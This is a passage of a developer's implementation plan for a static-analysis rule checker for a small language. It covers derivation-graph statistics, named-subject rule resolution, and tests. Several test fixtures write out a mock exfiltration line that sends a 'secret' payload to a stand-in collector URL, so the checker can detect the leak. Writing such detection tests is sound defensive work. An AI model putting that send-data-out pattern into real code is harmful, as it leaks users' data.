- [ ] **Step 1: Implement the flag**

Add a helper and a branch in `main()`:

```python
def derivation_stats(surface):
    """Max/mean node count per effect, and max graph depth — P-Q10."""
    def count_and_depth(node, seen=None):
        seen = seen if seen is not None else set()
        if node is None or id(node) in seen:
            return 0, 0
        seen.add(id(node))
        count, depth = 1, 1
        for i in node.inputs:
            c, d = count_and_depth(i, seen)
            count += c
            depth = max(depth, 1 + d)
        return count, depth

    counts, depths = [], []
    for e in surface.declared:
        if e.derivation is None:
            continue
        c, d = count_and_depth(e.derivation)
        counts.append(c)
        depths.append(d)
    if not counts:
        return {"effects_with_derivation": 0, "max_nodes": 0, "mean_nodes": 0,
                "max_depth": 0}
    return {
        "effects_with_derivation": len(counts),
        "max_nodes": max(counts),
        "mean_nodes": round(sum(counts) / len(counts), 2),
        "max_depth": max(depths),
    }
```

In `main()`, after `surface = analyse_file(path, follow=follow)` and before the `--rules`/`--json` branches:

```python
    if "--derivation-stats" in args:
        stats = derivation_stats(surface)
        print(f"derivation stats for {os.path.basename(path)}")
        print(f"  effects with a derivation: {stats['effects_with_derivation']}")
        print(f"  max nodes per effect:      {stats['max_nodes']}")
        print(f"  mean nodes per effect:     {stats['mean_nodes']}")
        print(f"  max graph depth:           {stats['max_depth']}")
        return 0
```

Update the module docstring's usage list to add:
```
  python3 shapes_cli.py program.planes --derivation-stats  # P-Q10 node-count/depth measurement
```

- [ ] **Step 2: Run it on both target programs**

```bash
python3 shapes_cli.py hn.planes --derivation-stats
python3 shapes_cli.py money.planes --derivation-stats
```

- [ ] **Step 3: STOP — report the four numbers for each file to the user before writing any more code.**

Do not add suppression heuristics regardless of the outcome. If node counts are large, that is a finding to report, not a problem to hide (build-prompt §4).

- [ ] **Step 4: Commit**

```bash
git add shapes_cli.py
git commit -m "shapes_cli: add --derivation-stats for the P-Q10 measurement"
```

---

## Task 5: Narrow `RuleNotSupported` with P-Q18 scoping

**Files:**
- Modify: `rules.py` (`check()`, new `_resolve_subject`/`_subject_matches`, `Violation`)
- Modify: `shapes_cli.py` (pass `declaring_file=path`)
- Test: `test_rules.py` (new tests; one existing test's message updated)

**Interfaces consumed:** `Surface.origins_of` (Task 3).

**Interfaces produced:** `check(rules, surface, declaring_file=None)` (signature change, default-compatible); `Violation(..., origins=None)`.

- [ ] **Step 1: Update `rules.py`'s module and `RuleNotSupported` docstrings**

The current `RuleNotSupported` docstring says binding a named subject "requires a static derivation graph, which this slice does not build." That claim is now false. Replace:

```python
class RuleNotSupported(Exception):
    """A rule this checker cannot evaluate.

    A named subject (anything other than the `anything` wildcard) is
    resolved against the static derivation graph shapes.py now retains
    (Surface.origins_of), scoped to the file that declares the rule
    (P-Q18): a rule may not reach across an import boundary to bind a name
    it never saw declared. Raised when the subject cannot be resolved at
    all, or resolves only in another file — never silently treated as a
    match. Reporting such a rule as clean would be the exact failure the
    two guarantees exist to prevent: a rule that never ran, presented as a
    rule that passed.
    """
    pass
```

- [ ] **Step 2: `_resolve_subject` and `_subject_matches`**

Add near `narrows()`/`_target_matches()`:

```python
def _resolve_subject(rule, surface, declaring_file):
    """Validate a rule's named subject can be traced (P-Q16, P-Q18).

    Scans every declared effect's origins (any kind — a subject may only
    ever reach a boundary this rule doesn't name, and that is still a
    resolvable, just non-matching, subject). Three outcomes:

    - Found, in the file that declares this rule: resolved, return.
    - Found, but only in another file: RuleNotSupported naming that file
      — a rule cannot reach across an import boundary to a name it never
      saw declared (P-Q18).
    - Not found anywhere: RuleNotSupported naming the subject.

    Every message names the fix (unbound v1.1 §22 item 1).
    """
    all_origins = []
    for effect in surface.declared:
        all_origins.extend(surface.origins_of(effect))

    hits = [f for n, f in all_origins if n == rule.subject]
    if declaring_file in hits:
        return
    if hits:
        other = hits[0]
        raise RuleNotSupported(
            f"rule [{rule.name}] (line {rule.line}): subject "
            f"'{rule.subject}' only resolves in {other}, not in the file "
            f"that declares this rule — a rule cannot reach across an "
            f"import boundary to a name it never saw declared\n"
            f"  write the rule in {other} instead, or name a subject "
            f"local to this file")
    raise RuleNotSupported(
        f"rule [{rule.name}] (line {rule.line}): subject "
        f"'{rule.subject}' does not resolve to anything in the traced "
        f"effect surface — checking it needs a value this file's "
        f"derivation graph can reach\n"
        f"  check the name is spelled as it appears in this file, or "
        f"write the rule against 'anything' instead")


def _subject_matches(rule, effect, surface, declaring_file):
    """Does this effect's target provably derive from the rule's subject,
    within the file that declares the rule?

    'anything' always matches — the wildcard subject predates named-subject
    resolution and every existing anything-rule must keep working exactly
    as before.
    """
    if rule.subject == "anything":
        return True
    origins = surface.origins_of(effect)
    return any(n == rule.subject and f == declaring_file for n, f in origins)
```

- [ ] **Step 3: Update `check()`**

```python
def check(rules, surface, declaring_file=None):
    """Every violation of every rule, given a computed effect surface.

    `declaring_file` scopes named-subject resolution (P-Q18): defaults to
    None, which matches every node's file when the surface came from
    `analyse(src)` with no path (every node's file is None too) — so every
    existing single-file caller keeps working unchanged. `shapes_cli.py`
    passes the entry file's path.
    """
    for rule in rules:
        if rule.subject != "anything":
            _resolve_subject(rule, surface, declaring_file)

    active = _resolve_active(rules)
    _check_permits_are_related(active)
    _check_conflicts(active)

    forbids = [r for r in active if r.assertion == "forbid"]
    permits = [r for r in active if r.assertion == "permit"]

    results = []
    for rule in forbids:
        for effect in surface.declared:
            if effect.kind != rule.kind:
                continue
            matched, uncertain = _target_matches(rule, effect)
            if not matched:
                continue
            if not _subject_matches(rule, effect, surface, declaring_file):
                continue

            clearer = None
            for p in permits:
                if not (p.supersedes == rule.name or narrows(p, rule)):
                    continue
                p_matched, p_uncertain = _target_matches(p, effect)
                if (p_matched and not p_uncertain
                        and _subject_matches(p, effect, surface, declaring_file)):
                    clearer = p
                    break

            origins = surface.origins_of(effect)
            if clearer is not None:
                results.append(Violation(rule, effect, uncertain=uncertain,
                                         cleared_by=clearer, origins=origins))
                continue

            narrowers = [
                other for other in forbids
                if other is not rule and narrows(other, rule)
                and _target_matches(other, effect)[0]
            ]
            results.append(Violation(rule, effect, uncertain=uncertain,
                                     narrowed_by=narrowers, origins=origins))

    return results
```

- [ ] **Step 4: `Violation` gains `origins` and a rendered derivation line**

```python
    def __init__(self, rule, effect, uncertain=False, cleared_by=None,
                narrowed_by=None, origins=None):
        self.rule = rule
        self.effect = effect
        self.uncertain = uncertain
        self.cleared_by = cleared_by
        self.narrowed_by = narrowed_by or []
        self.origins = origins or []

    @property
    def is_violation(self):
        return self.cleared_by is None

    def render(self):
        if self.cleared_by is not None:
            return (f"[{self.rule.name}] would have been violated at "
                    f"line {self.effect.site} — excepted by "
                    f"[{self.cleared_by.name}] "
                    f"(line {self.cleared_by.line})")

        lines = [f"[{self.rule.name}] violated at line {self.effect.site}."]
        lines.append(f"  {self.effect}")
        if self.uncertain:
            lines.append(
                "  target could not be pinned down statically — this "
                f"computed value may or may not be \"{self.rule.target}\"")
        lines.append(f"  rule declared at line {self.rule.line}: "
                     f"{condition(self.rule)}")
        if self.narrowed_by:
            names = ", ".join(f"[{r.name}] (line {r.line})"
                              for r in self.narrowed_by)
            lines.append(f"  narrowed here by {names}")
        if self.origins:
            parts = sorted({f"{n} ({f})" if f else n for n, f in self.origins})
            lines.append(f"  derived from: {', '.join(parts)}")
        return "\n".join(lines)
```

- [ ] **Step 5: `shapes_cli.py` passes `declaring_file`**

```python
        try:
            results = check_rules(found, surface, declaring_file=os.path.abspath(path))
        except (RuleNotSupported, RuleConflict) as e:
            print(f"rule check error — {e}", file=sys.stderr)
            return 1
```

Note `analyse_file` now sets `combined.entry_file = os.path.abspath(path)` (Task 1) — match that exactly (`os.path.abspath(path)`) so the two agree.

- [ ] **Step 6: Update the one existing test whose message changes**

In `test_rules.py`, `test_named_subject_raises_rather_than_passing_silently` currently asserts `"not yet supported" in str(e)`. That phrase described the old blanket refusal; the new message says the subject doesn't resolve. Update:

```python
def test_named_subject_raises_rather_than_passing_silently():
    src = ('use http\n'
           'rule [readings-stay-local] readings may not ask\n'
           'x = ask "https://example.com/a.json"\n')
    prog = parse(src)
    found = [s for s in prog if isinstance(s, Rule)]
    surface = analyse(src)
    try:
        check(found, surface)
        assert False, "should raise, not report clean"
    except RuleNotSupported as e:
        assert "readings" in str(e)
        assert "does not resolve" in str(e)
```

This is the "existing test changed" item — argued in `REPORT_DERIVATION.md` (decision 5 above): the message text changed because the checker's capability changed (it can now trace derivation), not because its safety guarantee weakened; `"does not resolve"` still means the same thing `"not yet supported"` used to guard: this program cannot report clean against this rule.

- [ ] **Step 7: New tests — named subject, same file / imported file / unresolvable**

```python
def test_named_subject_resolves_and_checks_in_the_same_file():
    src = ('use http\n'
           'to send of payload:\n'
           '  give ask "https://collector.example.com/?d=" + payload\n\n'
           'rule [no-payload-leak] payload may not ask\n'
           'x = send of "secret"\n')
    v = rule_violations(src)
    assert len(v) == 1
    assert v[0].rule.name == "no-payload-leak"
    assert v[0].is_violation


def test_named_subject_in_an_imported_file_is_not_supported():
    from shapes import analyse_file as af
    from rules import check
    from parser import parse
    import os

    d = "demo/_deriv_subject"
    os.makedirs(d, exist_ok=True)
    open(os.path.join(d, "lib.planes"), "w").write(
        'use http\n'
        'to send of payload:\n'
        '  give ask "https://collector.example.com/?d=" + payload\n')
    open(os.path.join(d, "main.planes"), "w").write(
        'use lib\n'
        'rule [no-leak] payload may not ask\n'
        'x = send of "secret"\n')
    try:
        main_path = os.path.join(d, "main.planes")
        surface = af(main_path)
        prog = parse(open(main_path).read())
        found = [s for s in prog if isinstance(s, Rule)]
        try:
            check(found, surface, declaring_file=os.path.abspath(main_path))
            assert False, "should raise, not report clean"
        except RuleNotSupported as e:
            msg = str(e)
            assert "payload" in msg
            assert "lib.planes" in msg
    finally:
        import shutil
        shutil.rmtree(d, ignore_errors=True)


def test_named_subject_unresolvable_does_not_report_clean():
    src = ('use http\n'
           'rule [x] nonexistent-name may not ask\n'
           'y = ask "https://example.com/a.json"\n')
    prog = parse(src)
    found = [s for s in prog if isinstance(s, Rule)]
    surface = analyse(src)
    try:
        check(found, surface)
        assert False, "should raise, not report clean"
    except RuleNotSupported as e:
        assert "nonexistent-name" in str(e)
```

(`test_named_subject_resolves_and_checks_in_the_same_file` needs `Rule` imported — already imported at the top of `test_rules.py`.)

- [ ] **Step 8: `rules.py` import assertion, and the §24 derivation-line test**

```python
def test_rules_module_imports_only_hashlib():
    """SS8's duck-typing claim, asserted directly rather than only reviewed."""
    import ast
    tree = ast.parse(open("rules.py").read())
    imports = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            imports.update(alias.name for alias in node.names)
        elif isinstance(node, ast.ImportFrom):
            imports.add(node.module)
    assert imports == {"hashlib"}


def test_violation_render_includes_derivation_line_when_traceable():
    src = ('use http\n'
           'to send of payload:\n'
           '  give ask "https://collector.example.com/?d=" + payload\n\n'
           'rule [no-leak] anything may not ask\n'
           'x = send of "secret"\n')
    v = rule_violations(src)
    rendered = v[0].render()
    assert "derived from:" in rendered
    assert "payload" in rendered


def test_violation_render_omits_derivation_line_when_not_traceable():
    src = ('use http\n'
           'rule [no-net] anything may not ask\n'
           'x = ask "https://example.com/a.json"\n')
    v = rule_violations(src)
    rendered = v[0].render()
    assert "derived from:" not in rendered
```

- [ ] **Step 9: Run the full `test_rules.py` and `test_shapes.py` suites**

```bash
python3 test_rules.py
python3 test_shapes.py
python3 test_planes.py
```
Expected: all green.

- [ ] **Step 10: Commit**

```bash
git add rules.py shapes_cli.py test_rules.py
git commit -m "rules: resolve named subjects against the static derivation graph, scoped to the declaring file (P-Q18)"
```

---

## Task 6: Session report

**Files:**
- Create: `REPORT_DERIVATION.md`

- [ ] **Step 1: Gather the facts to report**

```bash
python3 -c "import ast; tree = ast.parse(open('rules.py').read()); print(sorted({a.name for n in ast.walk(tree) if isinstance(n, ast.Import) for a in n.names} | {n.module for n in ast.walk(tree) if isinstance(n, ast.ImportFrom)}))"
python3 shapes_cli.py hn.planes --derivation-stats
python3 shapes_cli.py money.planes --derivation-stats
python3 test_shapes.py | tail -3
python3 test_rules.py | tail -3
git log --oneline -10
```

- [ ] **Step 2: Write `REPORT_DERIVATION.md`**

Cover, per build-prompt §7: the `rules.py` import block (quoted, confirmed `{"hashlib"}`); the P-Q10 numbers for `hn.planes` and `money.planes` with a verdict (bounded/creep); the `const_value()` decision (rejected — no external callers, updated every call site); the one changed existing test, argued (message text, not guarantee, changed); the undocumented decisions this build made (the file-threading-via-`self.current_file` approach, the always-wrap-in-name `Var` design, the collapse of RuleNotSupported's four bullets to three, the `"call"`-node-inputs-are-arguments-only choice) — named explicitly for accept/reject; test counts before (recorded at the start of Task 1) vs. after.

- [ ] **Step 3: Commit**

```bash
git add REPORT_DERIVATION.md
git commit -m "docs: session report for the static derivation graph build"
```

---

## Self-review checklist (run before executing)

- [x] §3.1 `StaticDeriv` — Task 1 Step 1.
- [x] §3.2 `const()`/`pattern()` returning nodes, `const_value()` decision — Task 1 Steps 6–9, decision 1.
- [x] §3.3 `Effect.derivation`, hash/equality exclusion — Task 2.
- [x] §3.4 `Surface.derivation_of`/`origins_of`, §8 survives — Task 3, Task 5 Step 1 (docstring), report Task 6.
- [x] §3.5 Narrow `RuleNotSupported`, P-Q18 — Task 5.
- [x] §3.6 §24 derivation line — Task 5 Step 4.
- [x] §4 P-Q10 measurement, stop-and-report — Task 4.
- [x] §5 ten required tests — mapped: (1)(2) Task 2 Step 4 + Task 1 Step 15; (3)(4) Task 1 Step 15; (5)(6)(7) Task 5 Step 7; (8) Task 5 Step 8; (9) Task 5 Step 8; (10) untouched, verified in Task 5 Step 9 / Task 1 Step 14.
- [x] §6 order of work — Tasks 1–6 follow it, with steps 1–2 combined (documented, decision list item implicit in Task 1's header) and the reporting gate preserved as Task 4.
- [x] §7 report contents — Task 6.
- [x] §8 standing terms — session gate tests explicitly called out as untouched in Global Constraints; no new suite; derivable metadata (file paths) derived via `func_file`/`entry_file`, never asked.
